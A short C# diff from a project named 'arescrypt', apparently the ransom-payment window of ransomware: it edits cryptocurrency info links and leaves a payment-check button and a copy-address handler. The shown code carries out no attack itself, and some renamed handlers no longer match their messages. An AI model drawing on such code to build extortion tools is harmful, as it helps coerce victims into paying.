@@ -98,13 +98,13 @@ namespace arescrypt
         }
 
         private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        { MessageBox.Show("Learn more about Bitcoin at [https://bitcoin.org/]"); } // Process.Start("https://bitcoin.org"); }
+        { MessageBox.Show("Learn more about Bitcoin at [https://bitcoin.org/]"); }
 
-        private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        { MessageBox.Show("Learn more about Litecoin at [https://litecoin.com/]"); } // Process.Start("https://litecoin.com/"); }
+        private void aboutBuyingBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        { MessageBox.Show("Learn more about Litecoin at [https://litecoin.com/]"); }
 
-        private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        { MessageBox.Show("Learn more about Zcash at [https://z.cash/]"); } // Process.Start("https://z.cash/"); }
+        private void contactButton_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        { MessageBox.Show("Learn more about Zcash at [https://z.cash/]"); }
 
         private void checkpaymentBtn_Click(object sender, EventArgs e)
         {
@@ -144,10 +144,5 @@ namespace arescrypt
 
         private void copyBtn_Click(object sender, EventArgs e)
         { cryptoAddress.Select(); Clipboard.SetText(cryptoAddress.Text); }
-
-        private void Display_Load(object sender, EventArgs e)
-        {
-
-        }
     }
 }
